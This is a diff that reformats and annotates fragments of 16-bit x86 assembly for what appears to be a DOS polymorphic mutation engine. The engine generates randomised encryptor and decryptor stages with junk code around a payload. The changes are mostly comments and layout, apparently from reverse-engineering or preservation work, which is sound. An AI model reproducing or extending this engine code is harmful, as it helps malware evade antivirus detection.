@@ -113,7 +113,7 @@ CODE_START:
 ; di = offset of decryption routine end
 ; si = offset of loop start
 
-MUT_ENGINE      proc near ; {{{
+MUT_ENGINE proc near ; {{{
         cld
         push    ds
         push    dx
@@ -140,7 +140,8 @@ MUT_ENGINE      proc near ; {{{
         sub     di, cx
         push    di
         push    dx
-        rep movsb
+        rep
+        movsb
         pop     cx
         pop     dx
 
@@ -155,143 +156,163 @@ get_arg_size:
 MUT_ENGINE      endp ; }}}
 
 make_enc_and_dec proc near ; {{{
-                push    es
-                pop     ds
-                add     cx, 22          ; MAX_ADD_LEN - 3
-                neg     cx
-                and     cl, -2
-                jnz     @@dont_round_size
-                dec     cx
-                dec     cx
+
+        push    es
+        pop     ds              ; ds = work seg
+        add     cx, 22          ; MAX_ADD_LEN - 3
+        neg     cx
+        and     cl, 0FEh
+        jnz     @@dont_round_size
+        dec     cx
+        dec     cx
 
 @@dont_round_size:
-                xchg    ax, di
-                mov     arg_code_entry, ax
-                add     ax, cx
-                and     al, -2
-                jnz     @@dont_round_end
-                dec     ax
-                dec     ax
+        xchg    ax, di
+        mov     arg_code_entry, ax
+        add     ax, cx
+        and     al, 0FEh
+        jnz     @@dont_round_end
+        dec     ax
+        dec     ax
 
 @@dont_round_end:
-                push    ax
-                xchg    ax, di
-                mov     di, offset arg_flags
-                stosw
-                xchg    ax, cx
-                stosw
-                xchg    ax, bp
-                stosw
-                xchg    ax, si
-                stosw
-                mov     cl, 20h         ; test for shift 0x1f masking
-                shl     cl, cl
-                xor     cl, 20h
-                mov     (is_8086 - reg_set_dec)[di], cl
+        push    ax              ; save -(len + 22 - entry)
+        xchg    ax, di
+        mov     di, offset arg_flags
+        stosw
+        xchg    ax, cx
+        stosw
+        xchg    ax, bp
+        stosw
+        xchg    ax, si
+        stosw
+        mov     cl, 20h         ; test for shift 0x1f masking
+        shl     cl, cl
+        xor     cl, 20h         ; 286:0, 8086:20
+        mov     (is_8086 - reg_set_dec)[di], cl
 
 @@restart:                              ; bp = total_end
-                pop     bp
-                push    bp
-                push    bx              ; bx = amount of junk to make
+        pop     bp
+        push    bp
+        push    bx              ; bx = amount of junk to make
 
-                call    RND_INIT        ; unusual to srand() multiple times
+        call    RND_INIT        ; unusual to srand() multiple times
 
-                ; although di is initially reg_set_dec (arg_flags+8*2), it
-                ; won't be on restart!
-                mov     di, offset reg_set_dec
-                mov     cx, 8
-                mov     al, -1
-                rep stosb
+        ; although di is initially reg_set_dec (arg_flags+8*2), it
+        ; won't be on restart!
+        mov     di, offset reg_set_dec
+        mov     cx, 8
+        mov     al, -1
+        rep stosb
 
-                mov     di, offset decrypt_stage
-                mov     bl, 7           ; XXX bl=7 for pre-loop junk
-                call    @@make          ; generates junk on the first call
-                dec     di              ; rewind the retf
-                cmp     di, offset decrypt_stage
-                jz      @@nothing_emitted
+        mov     di, offset decrypt_stage
+        mov     bl, 7           ; bl=7 for pre-loop junk
+        call    @@make          ; generates junk on the first call
+        dec     di              ; rewind the retf
+        cmp     di, offset decrypt_stage
+        jz      @@nothing_emitted
 
-                ; get our key value
-                push    dx
-                push    di
-                push    bp              ; bp = end of generated junk
-                mov     ax, 1
-                call    exec_enc_stage
-                pop     di
-                xchg    ax, bp
-                stosw                   ; patch the "mov reg,imm16"
-                pop     di
-                pop     dx
+        ; get our key value
+        push    dx
+        push    di
+
+        ; bp = location of the MOV's imm16 (see @@load_arg)
+        push    bp 
+        mov     ax, 1
+        call    exec_enc_stage
+        pop     di
+        xchg    ax, bp
+        stosw                   ; patch the "mov reg,imm16"
+
+        pop     di
+        pop     dx
 
 @@nothing_emitted:
-                pop     bx
-                pop     ax
-                xor     bp, bp
+        pop     bx
+        pop     ax
+        xor     bp, bp
 
-@@make:         push    ax
-                push    bx
+@@make:
+        push    ax
+        push    bx
 
-                push    dx
-                push    di              ; save pointer into decrypt_stage
+        push    dx
+        push    di              ; save pointer into decrypt_stage
 
-                xor     ax, ax
-                mov     di, offset jnz_patch_dec
-                mov     cx, di          ; 0x63
-                rep stosw
+        xor     ax, ax
+        mov     di, offset jnz_patch_dec
+        mov     cx, di          ; 0x63 (cute)
+        rep
+        stosw
 
-                mov     al, 4           ; don't assume cs == ss, needed for the staged encryption
-                xchg    al, byte ptr (arg_flags + 1 - op_idx)[di]
-                push    ax              ; save old flags
+        mov     al, 4           ; don't assume cs == ss, needed for the staged encryption
+        xchg    al, byte ptr (arg_flags + 1 - op_idx)[di]
+        push    ax              ; save old flags
 
-                mov     dx, (arg_size_neg - op_idx)[di]
-                mov     di, offset encrypt_stage
-                push    bp
-                call    g_code          ; make encryptor
-                pop     bp
-                call    invert_ops
+        mov     dx, (arg_size_neg - op_idx)[di]
+        mov     di, offset encrypt_stage
+        push    bp
+        call    g_code          ; make encryptor
+        pop     bp
+        call    invert_ops
 
-                pop     ax              ; get flags back
+        pop     ax              ; get flags back
 
-                pop     di              ; get the pointer into decrypt_stage back
-                pop     dx
+        pop     di              ; get the pointer into decrypt_stage back
+        pop     dx
 
-                mov     byte ptr arg_flags+1, al
-                and     al, 1           ; run on diff cpu?
-                sub     is_8086, al     ; if yes: 8086, 0:-1; 286+, 0x20:0x1f
-                push    ax
-                call    g_code_from_ops ; make decryptor
-                pop     ax              ; flags
-                add     (is_8086 - ptr_reg)[si], al ; restore val
+        mov     byte ptr arg_flags+1, al
+        and     al, 1           ; run on diff cpu?
+        sub     is_8086, al     ; if yes: 286+, 0:-1; 8086, 0x20:0x1f
+        push    ax
+        call    g_code_from_ops ; make decryptor
+        pop     ax              ; flags
+        add     (is_8086 - ptr_reg)[si], al ; restore val
 
-                xchg    ax, bx
-                pop     bx
-                ; ax is the second patch point; 0 if g_code failed; 0xff00 if we should loop
-                sub     ax, offset patch_dummy
-                jb      @@restart       ; loop
-                jnz     @@done          ; single ref
-                cmp     (arg_start_off - ptr_reg)[si], ax
-                jnz     @@restart
+        xchg    ax, bx
+        pop     bx
+        ; ax is the second patch point; 0 if g_code failed; 0xff00 if we
+        ; should loop
+        sub     ax, offset patch_dummy
+        jb      @@restart       ; loop
+        jnz     @@done          ; single ref
 
-@@done:         pop     bx
-                retn
+        ; start off == 0?
+        cmp     (arg_start_off - ptr_reg)[si], ax
+        jnz     @@restart
+
+@@done:
+        pop     bx
+        retn
 make_enc_and_dec endp ; }}}
 
 encrypt_target  proc near ; {{{
-        add     cx, dx
-        mov     dx, di
+        ; input
+        ;   cx: length of routine
+        ;   dx: offset of execution
+        ;   ax: optionally, entry point
+        ;   bp: payload seg
+        ;   si: payload off
+        add     cx, dx          ; cx=len+exec offset
+        mov     dx, di          ; dx=buf
         xchg    ax, di
+
         mov     ax, arg_code_entry
         test    ax, ax
         jnz     @@entry_not_zero
+
         mov     di, offset work_top
 
 @@entry_not_zero:
+
+        ; rewrite the generated pushes to pops {{{
         mov     bx, offset decrypt_stage
 
         push    cx
         push    ax
 @@fix_pop_loop:
         cmp     bx, dx
-        jz      @@emit_jump
+        jz      @@pops_done
         dec     bx
         mov     al, [bx]
         xor     al, 1
@@ -302,36 +323,45 @@ encrypt_target  proc near ; {{{
         stosb
         inc     cx
         jmp     @@fix_pop_loop
-
-@@emit_jump:
+@@pops_done:
         pop     dx
         pop     ax
+        ; }}}
 
         mov     bx, offset patch_dummy
 
+        ; check if a different entry point was given by the caller.  if so,
+        ; emit a JMP NEAR.
         test    dx, dx
         jz      @@emit_align_nops
 
         xchg    ax, cx
-        mov     al, 0E9h
+        mov     al, 0E9h        ; JMP off16
         stosb
-        mov     bx, di
+        mov     bx, di          ; patch point
         xchg    ax, dx
         stosw
+
         mov     di, offset work_top
 
-@@emit_align_nops:                      ; align?
+@@emit_align_nops:
+        ; align?
         test    byte ptr arg_flags+1, 8
         jnz     @@no_align
 
         neg     cx
         and     cx, 0Fh
         mov     al, 90h         ; nop padding
-        rep stosb
+        rep
+        stosb
 
 @@no_align:
+        ; if there's an entry point != 0, bx will point to the off16 of the
+        ; generated JMP NEAR.  if the entry point is 0, bx points to patch_dummy.
         lea     ax, (ops - work_top)[di]
-        add     [bx], ax        ; patch the ptr+off addr
+        add     [bx], ax
+
+        ; add any additional bytes we've generated
         and     al, 0FEh
         add     arg_size_neg, ax
         call    get_arg_size
@@ -697,7 +727,11 @@ emit_mov_reg_reg:
         cmp     dh, al
         jz      _ret            ; dont op on the same reg
 
-        ; on 286, creating compat code?
+        ; on 286, generating a
+        ;   MOV CL,BL
+        ;   MOV CX,SI
+        ;   MOV CX,DI
+        ;   MOV CX,BP
         cmp     byte ptr (is_8086 - ptr_reg)[si], 0FFh
         jnz     bl_op_reg_mrm
 
@@ -744,100 +778,122 @@ encode_op_mrm:                          ; al = op, bl = reg, dh = rm
         retn
 emit_mov_reg endp ; }}}
 
-get_op_loc      proc near ; {{{
-                mov     bx, ax
-                shr     al, 1
-                mov     cx, ax
-                shl     cx, 1
-                mov     di, (offset ops_args+2)
-@@again:        repne scasb
-                jnz     stc_ret
-                lea     si, (ops - (ops_args+1))[di]
-                shr     si, 1
-                cmp     byte ptr [si], 3 ; non-op?
-                jb      @@again
-                lea     ax, (ops - (ops_args+1))[di]
-                retn
-get_op_loc      endp ; }}}
+get_op_loc proc near ; {{{
+        ; for an given ops_args index, find its parent
+        mov     bx, ax
+        shr     al, 1
+        mov     cx, ax
+        shl     cx, 1
+        mov     di, (offset ops_args+2)
+@@again:
+        repne
+        scasb
+        jnz     stc_ret
+        lea     si, (ops - (ops_args+1))[di]
+        shr     si, 1
 
-invert_ops      proc near ; {{{
-                mov     al, op_end_idx
-                cbw
-                shl     al, 1
-                call    get_op_loc
-                jb      @@_ret
-                mov     op_idx, al
+        ; nodes in ops 0..2 are terminal, with the ops_args being the load
+        ; value.  in case we inadvertently get a match on the value, ensure
+        ; the node is not in 0..2.
+        cmp     byte ptr [si], 3 ; operand?
+        jb      @@again
 
-@@again:        call    get_op_loc
-                jnb     @@not_marker
-                xor     al, al
+        lea     ax, (ops - (ops_args+1))[di]
+        retn
+get_op_loc endp ; }}}
+
+invert_ops proc near ; {{{
+        mov     al, op_end_idx
+        cbw
+        shl     al, 1
+        call    get_op_loc      ; get parent
+        jc      @@_ret
+        mov     op_idx, al
+
+@@again:
+        call    get_op_loc      ; get parent
+        jnc     @@not_marker
+        xor     al, al          ; couldn't find it
 
 @@not_marker:
-                push    ax
-                shr     al, 1
-                mov     (ops_args - ops)[bx], al
-                shr     bl, 1
-                lahf
-                mov     al, (ops - ops)[bx]
-                and     al, 7Fh
-                cmp     al, 3
-                jnz     @@not_sub
-                sahf
-                jb      @@done
-                inc     ax              ; 3 -> 4, sub -> add
-                jmp     @@store
+        push    ax
 
-@@not_sub:                              ; add
-                cmp     al, 4
-                jnz     @@maybe_mul
-                sahf
-                jnc     @@dec_store     ; nc -> change to sub
-                mov     si, bx
-                mov     cl, 8
-                rol     word ptr (ops_args - ops)[bx+si], cl
+        shr     al, 1
+        mov     (ops_args - ops)[bx], al
 
-@@dec_store:    dec     ax
-                jmp     @@store
+        shr     bl, 1
+        lahf                    ; c set if left
 
-@@maybe_mul:    cmp     al, 6
-                jb      @@done
-                jnz     @@toggle_rotate
+        mov     al, (ops - ops)[bx]
+        and     al, 7Fh         ; clear x flag
 
-                ; is mul.  set arg to the multiplicative inverse.
+        ; sub->add if we're on the rhs, i.e.
+        ; x1 = sub(y,x0)
+        ; add(x1, y) = x0
+        cmp     al, 3
+        jnz     @@check_add
+        sahf
+        jc      @@done
+        inc     ax
+        jmp     @@store
 
-                shl     bl, 1
-                mov     bl, (ops_args + 1 - ops)[bx]
-                shl     bl, 1
-                mov     si, word ptr (ops_args - ops)[bx]
-                xor     ax, ax
-                mov     dx, 1
-                mov     cx, ax
-                mov     di, dx
+@@check_add:
+        ; add->sub
+        cmp     al, 4
+        jnz     @@maybe_mul
+        sahf
+        jnc     @@store_sub
+        ; flip args if we're on rhs
+        mov     si, bx
+        mov     cl, 8
+        rol     word ptr (ops_args - ops)[bx+si], cl
+@@store_sub:
+        dec     ax
+        jmp     @@store
 
-@@gcd_loop:     mov     word ptr (ops_args - ops)[bx], di
-                dec     si
-                jz      @@done
-                inc     si
-                div     si
-                push    dx
-                mul     di
-                sub     cx, ax
-                xchg    cx, di
-                mov     ax, si
-                xor     dx, dx
-                pop     si
-                jmp     @@gcd_loop
+@@maybe_mul:
+        cmp     al, 6
+        jb      @@done
+        jnz     @@toggle_rotate
+
+        ; is mul.  set arg to the multiplicative inverse.
+
+        shl     bl, 1
+        mov     bl, (ops_args + 1 - ops)[bx]
+        shl     bl, 1
+        mov     si, word ptr (ops_args - ops)[bx]
+        xor     ax, ax
+        mov     dx, 1
+        mov     cx, ax
+        mov     di, dx
+
+@@gcd_loop:
+        mov     word ptr (ops_args - ops)[bx], di
+        dec     si
+        jz      @@done
+        inc     si
+        div     si
+        push    dx
+        mul     di
+        sub     cx, ax
+        xchg    cx, di
+        mov     ax, si
+        xor     dx, dx
+        pop     si
+        jmp     @@gcd_loop
 
 @@toggle_rotate:
-                xor     al, 0Fh         ; toggle 7/8.  rol and ror
-@@store:        mov     (ops - ops)[bx], al
-@@done:         pop     ax
-                or      al, al
-                jnz     @@again
-                shr     op_idx, 1
+        xor     al, 0Fh         ; toggle 7/8.  rol and ror
 
-@@_ret:         retn
+@@store:
+        mov     (ops - ops)[bx], al
 
+@@done:
+        pop     ax
+        or      al, al
+        jnz     @@again
+        shr     op_idx, 1
+@@_ret: retn
 invert_ops      endp ; }}}
 
 g_code proc near ; {{{
@@ -851,7 +907,7 @@ g_code proc near ; {{{
 
 g_code_from_ops:                                ; called from make_enc_and_dec, and further down to loop
         ; in
-        ;   dh: target reg
+        ;   dx: target value (if signed, it's a load for arg_size_neg)
         ;   di: buf
         ;   bp: phase (-1,0,1,n)
         ; out
@@ -2047,7 +2103,9 @@ data_reg        db ?
 
 last_op         db ?                    ; 0 on single ref routines?
 last_op_flag    db ?                    ; FF uninit; 80 was imm; 40 sub (need neg); 0 mul; else reg in imm,imm
-patch_dummy     dw ?                    ; this gets the patch on single-ref routines
+; this gets the patch on single-ref routines, and the JMP NEAR's off16 when it
+; isn't needed
+patch_dummy     dw ? 
 
                 ; reserved for push generation (or just a single PUSHA when not (is_8086&&run_on_different_cpu))
 decrypt_pushes  db 7 dup(?)
